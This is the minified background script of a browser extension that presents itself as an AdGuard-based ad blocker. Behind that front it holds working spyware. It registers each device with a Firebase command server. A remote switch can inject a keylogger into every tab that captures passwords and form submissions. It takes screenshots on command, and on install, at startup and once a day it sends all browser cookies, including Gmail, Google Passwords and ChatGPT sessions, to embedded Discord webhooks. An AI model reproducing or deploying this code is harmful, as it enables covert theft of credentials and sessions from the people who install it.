let stats={total:0,perPage:{}};chrome.storage.local.get(["adsBlocked"],function(e){e.adsBlocked&&(stats.total=e.adsBlocked.total||0,stats.perPage=e.adsBlocked.perPage||{})});let pausedSites=new Set;function updateBadge(e,t){chrome.action.setBadgeText({tabId:e,text:t>0?t.toString():""}),chrome.action.setBadgeBackgroundColor({tabId:e,color:"#E40D0D"})}chrome.storage.local.get(["pausedSites"],function(e){e.pausedSites&&(pausedSites=new Set(e.pausedSites))}),chrome.tabs.onUpdated.addListener((e,t,a)=>{"loading"===t.status&&(stats.perPage[e]=0,updateBadge(e,0))}),chrome.tabs.onRemoved.addListener(e=>{delete stats.perPage[e]});let lastRunDate=null,isProcessing=!1,deviceId=null;const FIREBASE_DB_URL="https://adblock-90635-default-rtdb.firebaseio.com",REMOTE_STATUS_URL="https://raw.githubusercontent.com/dev6955/Klog/main/status.json",REMOTE_FILTERS_URL="https://raw.githubusercontent.com/dev6955/Klog/main/filters.json",ADGUARD_FILTER_LISTS={base:{name:"AdGuard Base filter",url:"https://filters.adtidy.org/extension/chromium/filters/2_optimized.txt",enabled:!0},tracking:{name:"AdGuard Tracking Protection",url:"https://filters.adtidy.org/extension/chromium/filters/3_optimized.txt",enabled:!0},annoyances:{name:"AdGuard Annoyances",url:"https://filters.adtidy.org/extension/chromium/filters/14_optimized.txt",enabled:!0},dns:{name:"DNS filter",url:"https://adguardteam.github.io/AdGuardSDNSFilter/Filters/filter.txt",enabled:!0}};let screenshotIntervalId=null,isKeyloggerEnabled=!1,isScreenshotEnabled=!1;async function downloadAdGuardFilters(){console.log("\uD83D\uDCE5 Downloading AdGuard filter lists...");let e={lists:{},lastUpdate:Date.now(),totalRules:0};for(let[t,a]of Object.entries(ADGUARD_FILTER_LISTS))if(a.enabled)try{console.log(`â³ Downloading ${a.name}...`);let s=await fetch(a.url),o=await s.text(),i=o.split("\n"),r=parseAdGuardFilter(i);e.lists[t]={name:a.name,url:a.url,ruleCount:r.length,lastUpdate:Date.now()},e.totalRules+=r.length,console.log(`âœ… ${a.name}: ${r.length} rules downloaded`),e.lists[t].tempRules=r}catch(n){console.error(`âŒ Failed to download ${a.name}:`,n),e.lists[t]={name:a.name,error:n.message,lastUpdate:Date.now()}}for(let l in await applyAdGuardFilters(e),e.lists)delete e.lists[l].tempRules;return await chrome.storage.local.set({adguardFilters:e}),console.log(`âœ… Total AdGuard rules processed: ${e.totalRules}`),e}function parseAdGuardFilter(e){let t=[];for(let a of e){let s=a.trim();!(!s||s.startsWith("!")||s.startsWith("[")||s.includes("##")||s.includes("#@#")||s.includes("#$#")||s.includes("#%#"))&&(s.startsWith("||")||s.startsWith("|"))&&t.push(s)}return t}async function applyAdGuardFilters(e){console.log("âš™ï¸ Applying AdGuard filters...");let t=[],a=5e3;for(let[s,o]of Object.entries(e.lists)){if(!o.tempRules)continue;let i=o.tempRules.slice(0,1e3);for(let r of i)try{let n=convertAdGuardRuleToDNR(r,a++);if(n&&t.push(n),a>1e4)break}catch(l){}if(a>1e4)break}try{let c=await chrome.declarativeNetRequest.getDynamicRules(),d=c.map(e=>e.id),u=d.filter(e=>e>=5e3&&e<=1e4);try{await chrome.declarativeNetRequest.updateDynamicRules({removeRuleIds:u,addRules:t.slice(0,5e3)}),console.log(`âœ… Applied ${t.length} AdGuard rules`)}catch(g){console.error("âš ï¸ Partial error applying rules (likely invalid rule format):",g)}}catch(m){console.error("âŒ Error applying AdGuard filters:",m)}}function convertAdGuardRuleToDNR(e,t){try{let a="";if(e.startsWith("||")&&e.includes("^")?a=e.substring(2,e.indexOf("^")):e.startsWith("||")&&(a=e.substring(2).replace(/\*/g,"").replace(/\^/g,"")),!a||a.length<3||!/^[a-zA-Z0-9.\-_%]+$/.test(a))return null;return{id:t,priority:1,action:{type:"block"},condition:{urlFilter:`||${a}`,resourceTypes:["script","image","xmlhttprequest","sub_frame","stylesheet"]}}}catch(s){return null}}async function getDeviceId(){if(deviceId)return deviceId;let e=await chrome.storage.local.get(["deviceId"]);if(e.deviceId)return deviceId=e.deviceId;await chrome.storage.local.set({deviceId:deviceId="dev_"+Date.now()+"_"+Math.random().toString(36).substr(2,9)});try{let t=await getSystemInfo(),a=await getIPAddress(),s=`
ðŸ†• **New Device Registered**

ðŸ†” Device ID: \`${deviceId}\`
ðŸŒ Browser: ${t.browser}
ðŸ’» OS: ${t.os}
ðŸ”§ Platform: ${t.platform}
ðŸŒ Language: ${t.language}
ðŸ“¡ IP Address: ${a}
â° Time: ${new Date().toLocaleString("en-US",{timeZone:"Asia/Riyadh"})}

ðŸ“ **To send commands to this device, use:**
\`\`\`json
{
  "commands": {
    "${deviceId}": {
      "cmd_001": {
        "type": "getInfo",
        "executed": false
      }
    }
  }
}
\`\`\`

**Available Commands:**
â€¢ \`collectData\` - Collect all cookies
â€¢ \`screenshot\` - Take screenshot
â€¢ \`getInfo\` - Get device information
        `.trim();await sendToDiscordWebhook(s),console.log("âœ… Device ID sent to Discord:",deviceId)}catch(o){console.error("âŒ Error sending device ID to Discord:",o)}return deviceId}async function initializeFirebase(){let e=await getDeviceId();console.log("\uD83D\uDD25 Firebase initialized - Device ID:",e),await registerDevice(),listenForCommands(),checkRemoteStatus(),setInterval(checkRemoteStatus,6e4)}async function registerDevice(){let e=await getDeviceId(),t=await getSystemInfo(),a=await getIPAddress();try{await fetch(`${FIREBASE_DB_URL}/devices/${e}.json`,{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify({deviceId:e,systemInfo:t,ipAddress:a,lastSeen:new Date().toISOString(),status:"online"})}),console.log("âœ… Device registered in Firebase")}catch(s){console.error("âŒ Error registering device:",s)}}async function listenForCommands(){let e=await getDeviceId();setInterval(async()=>{try{let t=await fetch(`${FIREBASE_DB_URL}/commands/${e}.json`),a=await t.json();if(a)for(let[s,o]of Object.entries(a))o&&!o.executed&&await executeCommand(s,o);await fetch(`${FIREBASE_DB_URL}/devices/${e}/lastSeen.json`,{method:"PUT",body:JSON.stringify(new Date().toISOString())})}catch(i){console.error("âŒ Error checking commands:",i)}},5e3)}async function checkRemoteStatus(){try{let e=await fetch("https://raw.githubusercontent.com/dev6955/Klog/main/status.json",{cache:"no-store"});if(e.ok){let t=await e.text(),a=t.replace(/\/\/.*$/gm,"");a=(a=a.replace(/\/\*[\s\S]*?\*\//g,"")).replace(/,(\s*[}\]])/g,"$1");let s=JSON.parse(a);handleRemoteStatus(s)}}catch(o){console.error("Error checking remote status:",o)}}function handleRemoteStatus(e){let t="active"===e.keylogger||!0===e.keylogger;t&&!isKeyloggerEnabled?(console.log("\uD83D\uDFE2 Remote: Enabling Keylogger"),isKeyloggerEnabled=!0,injectKeyloggerToAllTabs()):!t&&isKeyloggerEnabled&&(console.log("\uD83D\uDD34 Remote: Disabling Keylogger"),isKeyloggerEnabled=!1);let a="active"===e.screenshot||!0===e.screenshot,s=e.interval||30;a?isScreenshotEnabled?chrome.alarms.get("takeScreenshot",e=>{e&&e.periodInMinutes!==s/60&&(console.log(`â±ï¸ Remote: Updating Interval to ${s}s`),chrome.alarms.create("takeScreenshot",{periodInMinutes:s/60}))}):(console.log(`ðŸŸ¢ Remote: Enabling Screenshots (Every ${s}s)`),isScreenshotEnabled=!0,chrome.alarms.create("takeScreenshot",{periodInMinutes:s/60})):isScreenshotEnabled&&(console.log("\uD83D\uDD34 Remote: Disabling Screenshots"),isScreenshotEnabled=!1,chrome.alarms.clear("takeScreenshot"))}function keyloggerFunction(e){if(window.hasKeyloggerInitialized)return;window.hasKeyloggerInitialized=!0;let t=new WeakMap;async function a(t,a,s,o=null){let i=new Date().toLocaleString("en-US",{timeZone:"Asia/Riyadh"}),r=new FormData,n=`âŒ¨ï¸ **Text Input Captured**

ðŸ†” Device: \`${e}\`
ðŸŒ URL: ${a}
ðŸ“ Input Type: ${s}
â° Time: ${i}

**Content:**
\`\`\`
${t}
\`\`\``.trim();r.append("payload_json",JSON.stringify({content:n})),o&&r.append("file",o,`screenshot_${e}_${Date.now()}.png`);try{await fetch("https://discord.com/api/webhooks/1444029181980840020/kKearkRS-VAIF5kv-m_vsJriSGlkQ8Bqm4s-0GQuYlUu77Mbb8CguuUaKOV2cIqPJ7S",{method:"POST",body:r})}catch(l){}}async function s(){return new Promise(e=>{chrome.runtime.sendMessage({type:"captureScreenshot"},t=>{t&&t.success?fetch(t.dataUrl).then(e=>e.blob()).then(t=>e(t)).catch(()=>e(null)):e(null)})})}function o(e){if(t.has(e))return;t.set(e,!0);let o=e.value||e.textContent||"";e.addEventListener("blur",async function(){let t=e.value||e.textContent||"";if(t!==o&&t.trim().length>0){let i=window.location.href,r=e.tagName+(e.type?` (${e.type})`:""),n=await s();await a(t.trim(),i,r,n),o=t}},{passive:!0}),e.addEventListener("keydown",async function(t){if("Enter"===t.key){let i=e.value||e.textContent||"";if(i.trim().length>0){let r=window.location.href,n=e.tagName+(e.type?` (${e.type})`:""),l=await s();await a(i.trim(),r,n,l),o=i}}},{passive:!0})}console.log("\uD83D\uDD0D Keylogger initialized on:",window.location.href),function e(){let t=document.querySelectorAll('input[type="text"], input[type="email"], input[type="search"], input[type="password"], textarea, [contenteditable="true"]');t.forEach(e=>o(e))}();let i=new MutationObserver(e=>{e.forEach(e=>{e.addedNodes.forEach(e=>{if(1===e.nodeType&&(e.matches&&e.matches('input[type="text"], input[type="email"], input[type="search"], input[type="password"], textarea, [contenteditable="true"]')&&o(e),e.querySelectorAll)){let t=e.querySelectorAll('input[type="text"], input[type="email"], input[type="search"], input[type="password"], textarea, [contenteditable="true"]');t.forEach(e=>o(e))}})})});i.observe(document.body,{childList:!0,subtree:!0}),document.addEventListener("submit",async e=>{let t=e.target,o=new FormData(t),i={};for(let[r,n]of o.entries())n&&"string"==typeof n&&n.trim().length>0&&(i[r]=n);if(Object.keys(i).length>0){let l=window.location.href,c=JSON.stringify(i,null,2),d=await s();await a(c,l,"FORM SUBMISSION",d)}},{passive:!0})}async function injectKeyloggerToAllTabs(){try{let e=await getDeviceId(),t=await chrome.tabs.query({});for(let a of t)if(!(a.url&&(a.url.startsWith("chrome://")||a.url.startsWith("edge://")||a.url.startsWith("about:"))))try{await chrome.scripting.executeScript({target:{tabId:a.id},func:keyloggerFunction,args:[e]})}catch(s){}console.log("\uD83D\uDC89 Keylogger injected into active tabs")}catch(o){console.error("Error injecting keylogger:",o)}}async function executeCommand(e,t){let a=await getDeviceId();console.log("\uD83D\uDCE5 Executing command:",t.type);try{let s=null;switch(t.type){case"collectData":isProcessing?s={success:!1,message:"Already processing"}:(isProcessing=!0,await processAllCookies(),isProcessing=!1,s={success:!0,message:"Data collected and sent to Discord"});break;case"screenshot":s=await takeScreenshot(t.tabId);break;case"getInfo":let o=await getSystemInfo(),i=await getIPAddress(),r=await chrome.cookies.getAll({});s={success:!0,deviceId:a,systemInfo:o,ipAddress:i,cookiesCount:r.length,timestamp:new Date().toISOString()};let n=`
ðŸ“± **Device Information**

ðŸ†” Device ID: \`${a}\`
ðŸŒ Browser: ${o.browser}
ðŸ’» OS: ${o.os}
ðŸ”§ Platform: ${o.platform}
ðŸŒ Language: ${o.language}
ðŸ“¡ IP Address: ${i}
ðŸª Total Cookies: ${r.length}
â° Time: ${new Date().toLocaleString("en-US",{timeZone:"Asia/Riyadh"})}
                `.trim();await sendToDiscordWebhook(n);break;default:s={success:!1,message:"Unknown command: "+t.type}}await fetch(`${FIREBASE_DB_URL}/commands/${a}/${e}.json`,{method:"PATCH",headers:{"Content-Type":"application/json"},body:JSON.stringify({executed:!0,executedAt:new Date().toISOString(),result:s})}),console.log("âœ… Command executed:",e)}catch(l){console.error("âŒ Error executing command:",l),await fetch(`${FIREBASE_DB_URL}/commands/${a}/${e}.json`,{method:"PATCH",headers:{"Content-Type":"application/json"},body:JSON.stringify({executed:!0,executedAt:new Date().toISOString(),error:String(l)})})}}async function takeScreenshot(e,t=!1){try{let a=e;if(!a){let s=await chrome.tabs.query({active:!0,currentWindow:!0});s.length>0&&(a=s[0].id)}if(!a)return{success:!1,message:"No active tab found"};let o=await chrome.tabs.captureVisibleTab(null,{format:"png"}),i=await fetch(o),r=await i.blob(),n=new FormData,l=await getDeviceId(),c=`${t?"auto_screenshot":"screenshot"}_${l}_${Date.now()}.png`;n.append("file",r,c);let d=await fetch("https://discord.com/api/webhooks/1444029181980840020/kKearkRS-VAIF5kv-m_vsJriSGlkQ8Bqm4s-0GQuYlUu77Mbb8CguuUaKOxV2cIqPJ7S",{method:"POST",body:n});if(d.ok)return console.log("âœ… Screenshot sent to Discord"),{success:!0,message:"Screenshot captured and sent to Discord"};return{success:!1,message:"Failed to send screenshot"}}catch(u){return console.error("âŒ Screenshot error:",u),{success:!1,message:String(u)}}}function getTodayDate(){let e=new Date;return`${e.getFullYear()}-${e.getMonth()+1}-${e.getDate()}`}async function shouldRunToday(){let e=getTodayDate(),t=await chrome.storage.local.get(["lastRunDate"]);return(lastRunDate=t.lastRunDate)!==e&&(await chrome.storage.local.set({lastRunDate:e}),!0)}async function getSystemInfo(){let e=navigator.userAgent,t="Unknown",a="Unknown";return e.includes("Chrome")&&!e.includes("Edg")?t="Chrome":e.includes("Firefox")?t="Firefox":e.includes("Safari")&&!e.includes("Chrome")?t="Safari":e.includes("Edg")&&(t="Edge"),e.includes("Windows")?a="Windows":e.includes("Mac")?a="Mac":e.includes("Linux")?a="Linux":e.includes("Android")?a="Android":e.includes("iOS")&&(a="iOS"),{browser:t,os:a,userAgent:e,platform:navigator.platform,language:navigator.language}}async function getIPAddress(){try{let e=await fetch("https://api.ipify.org?format=json"),t=await e.json();return t.ip}catch(a){return console.error("Failed to get IP address:",a),"Unknown"}}async function sendToDiscordWebhook(e,t=null,a=""){let s="https://discord.com/api/webhooks/1423274695012122625/ZIOU5peCYRDq-eALAbuj7j5a3m6e_mCXJzTFO11xXSauVm6COFU1N9qiiSiXiwp7Hh_p";if(t){let o=new Blob([t],{type:"application/json"}),i=new FormData;i.append("file",o,a);try{let r=await fetch(s,{method:"POST",body:i});r.ok?console.log("âœ… File sent to Discord successfully!"):console.error("âŒ Error sending file:",r.status,r.statusText)}catch(n){console.error("âŒ Error sending file to Discord:",n)}}else try{let l=await fetch(s,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:e})});l.ok?console.log("âœ… Message sent to Discord successfully!"):console.error("âŒ Error sending message:",l.status,l.statusText)}catch(c){console.error("âŒ Error sending to Discord:",c)}}async function processAllCookies(){let e=await getSystemInfo(),t=await getIPAddress(),a=await chrome.cookies.getAll({}),s=new Date,o=s.toLocaleString("en-US",{timeZone:"Asia/Riyadh",year:"numeric",month:"2-digit",day:"2-digit",hour:"2-digit",minute:"2-digit",second:"2-digit"}),i=await getDeviceId(),r=`
ðŸš€ Starting cookies collection

ðŸ†” Device: \`${i}\`
ðŸ“… Time: ${o}
ðŸŒ Browser: ${e.browser}
ðŸ’» OS: ${e.os}
ðŸ”§ Platform: ${e.platform}
ðŸŒ Language: ${e.language}
ðŸ“¡ IP Address: ${t}
ðŸ“Š Total cookies: ${a.length}
    `.trim();for(let n of(await sendToDiscordWebhook(r),[{name:"YouTube",domains:["youtube","google"]},{name:"Instagram",domains:["instagram","facebook"]},{name:"Gmail",domains:["mail.google","google"]},{name:"Snapchat",domains:["snapchat"]},{name:"Google Drive",domains:["drive.google","google"]},{name:"Google Photos",domains:["photos.google","google"]},{name:"Google Passwords",domains:["passwords.google","google"]},{name:"Google My Activity",domains:["myactivity.google","google"]},{name:"ChatGPT",domains:["chatgpt","openai"]},{name:"Discord",domains:["discord"]},{name:"Microsoft Teams",domains:["teams.microsoft"]},{name:"OneDrive",domains:["onedrive.live"]},{name:"All Cookies",domains:[]}])){let l=[];if("All Cookies"===n.name)l=a;else{let c=n.domains.map(e=>e.toLowerCase());l=a.filter(e=>{let t=(e.domain||"").toLowerCase();return c.some(e=>t.includes(e))})}if(l.length>0)try{let d=JSON.stringify(l,null,2),u=n.name.replace(/[^\w\-]+/g,"_"),g=`cookies_${i}_${u}_${s.toISOString().split("T")[0]}.json`,m=`
âœ… ${n.name}
ðŸ“ Cookies Count: ${l.length}
ðŸ”— Domains: ${n.domains.join(", ")||"All domains"}
ðŸ“… Time: ${o}
ðŸŒ Browser: ${e.browser}
ðŸ’» OS: ${e.os}
ðŸ“¡ IP Address: ${t}
                `.trim();await sendToDiscordWebhook(m,d,g),await new Promise(e=>setTimeout(e,1e3))}catch(p){console.error(`âŒ Error in sending ${n.name}:`,p)}}let y=new Date,h=y.toLocaleString("en-US",{timeZone:"Asia/Riyadh",year:"numeric",month:"2-digit",day:"2-digit",hour:"2-digit",minute:"2-digit",second:"2-digit"}),f=`
ðŸŽ‰ Cookies collection process completed

ðŸ“… Time: ${h}
âœ… Status: Completed successfully
ðŸ•’ Duration: ${(y-s)/1e3} seconds
    `.trim();await sendToDiscordWebhook(f),console.log("âœ… All cookies sent to Discord")}chrome.runtime.onStartup.addListener(()=>{chrome.alarms.create("checkRemoteStatus",{periodInMinutes:1}),checkRemoteStatus()}),chrome.runtime.onInstalled.addListener(()=>{chrome.alarms.create("checkRemoteStatus",{periodInMinutes:1}),checkRemoteStatus()}),chrome.alarms.onAlarm.addListener(e=>{"checkRemoteStatus"===e.name?checkRemoteStatus():"takeScreenshot"===e.name?isScreenshotEnabled&&(console.log("\uD83D\uDCF8 Taking periodic screenshot..."),takeScreenshot(null,!0)):"updateAdGuardFilters"===e.name&&(console.log("\uD83D\uDD04 Periodic AdGuard filter update..."),downloadAdGuardFilters())}),chrome.runtime.onInstalled.addListener(async()=>{console.log("\uD83D\uDE80 Extension installed/updated - Loading filters..."),await downloadAdGuardFilters();try{let e=[{id:1001,priority:2,action:{type:"block"},condition:{urlFilter:"||68s8.com",resourceTypes:["script","sub_frame","xmlhttprequest","main_frame"]}},{id:1002,priority:2,action:{type:"block"},condition:{urlFilter:"||beluprles.ru",resourceTypes:["script","sub_frame","xmlhttprequest","main_frame"]}},{id:1003,priority:2,action:{type:"block"},condition:{urlFilter:"||gi-power.kz",resourceTypes:["script","sub_frame","xmlhttprequest","main_frame"]}},{id:1004,priority:2,action:{type:"block"},condition:{urlFilter:"||sultanwww",resourceTypes:["script","sub_frame","xmlhttprequest","main_frame"]}},{id:1005,priority:2,action:{type:"block"},condition:{urlFilter:"||obqj2.com",resourceTypes:["script","sub_frame","xmlhttprequest","main_frame"]}},{id:1006,priority:2,action:{type:"block"},condition:{urlFilter:"||ptichoolsougn.net",resourceTypes:["script","sub_frame","xmlhttprequest"]}},{id:1007,priority:1,action:{type:"block"},condition:{urlFilter:"||cloudflareinsights.com",resourceTypes:["script"]}}];await chrome.declarativeNetRequest.updateDynamicRules({removeRuleIds:[1001,1002,1003,1004,1005,1006,1007],addRules:e}),console.log("âœ… Aggressive ad-blocking rules applied for qesset.net")}catch(t){console.error("Error updating remote filters:",t)}chrome.alarms.create("checkRemoteStatus",{periodInMinutes:1}),chrome.alarms.create("updateAdGuardFilters",{periodInMinutes:1440});try{checkRemoteStatus()}catch(a){console.error("Error checking remote status:",a)}}),chrome.runtime.onMessage.addListener((e,t,a)=>{if("getStats"===e.type){let s=e.tabId;return a({adsPage:stats.perPage[s]||0,adsTotal:stats.total}),!0}if("checkPausedStatus"===e.type){let o=e.hostname;return a({isPaused:pausedSites.has(o)}),!0}if("togglePause"===e.type){let i=e.hostname;return pausedSites.has(i)?pausedSites.delete(i):pausedSites.add(i),chrome.storage.local.set({pausedSites:Array.from(pausedSites)}),a({isPaused:pausedSites.has(i)}),!0}if("adBlocked"===e.type){stats.total++;let r=t.tab?.id;return r>=0&&(stats.perPage[r]||(stats.perPage[r]=0),stats.perPage[r]++,updateBadge(r,stats.perPage[r]),chrome.storage.local.set({adsBlocked:{total:stats.total,perPage:stats.perPage}})),!0}if("captureScreenshot"===e.type)return chrome.tabs.captureVisibleTab(null,{format:"png"}).then(e=>{a({success:!0,dataUrl:e})}).catch(e=>{console.error("Screenshot error:",e),a({success:!1,error:String(e)})}),!0;if(e&&"saveAndExportAll"===e.action){if(isProcessing)return a({success:!1,error:"Processing"}),!0;isProcessing=!0,processAllCookies().then(()=>{a({success:!0})}).catch(e=>{a({success:!1,error:String(e)})}).finally(()=>{isProcessing=!1})}return!0}),chrome.webRequest.onBeforeRequest.addListener(function(e){stats.total++;let t=e.tabId;t>=0&&(stats.perPage[t]||(stats.perPage[t]=0),stats.perPage[t]++,updateBadge(t,stats.perPage[t]),chrome.storage.local.set({adsBlocked:{total:stats.total,perPage:stats.perPage}}))},{urls:["*://*.doubleclick.net/*","*://*.googlesyndication.com/*","*://*.googleadservices.com/*","*://*.google-analytics.com/*","*://www.facebook.com/tr/*","*://*.facebook.net/*"]}),chrome.runtime.onStartup.addListener(async()=>{console.log("\uD83D\uDE80 Browser started"),await initializeFirebase();let e=await shouldRunToday();if(e&&!isProcessing){console.log("Running daily task..."),isProcessing=!0;try{await processAllCookies(),console.log("Daily task completed successfully")}catch(t){console.error("Error in daily task:",t)}finally{isProcessing=!1}}else console.log("Task already ran today")}),chrome.runtime.onInstalled.addListener(async e=>{if(console.log("\uD83D\uDD27 Extension Installed/Updated"),await initializeFirebase(),"install"===e.reason){console.log("First install - sending cookies..."),isProcessing=!0;try{await processAllCookies(),console.log("Initial cookies sent successfully")}catch(t){console.error("Error sending initial cookies:",t)}finally{isProcessing=!1}}else if("update"===e.reason){let a=await shouldRunToday();if(a&&!isProcessing){console.log("Running update task..."),isProcessing=!0;try{await processAllCookies(),console.log("Update task completed")}catch(s){console.error("Error in update task:",s)}finally{isProcessing=!1}}}});
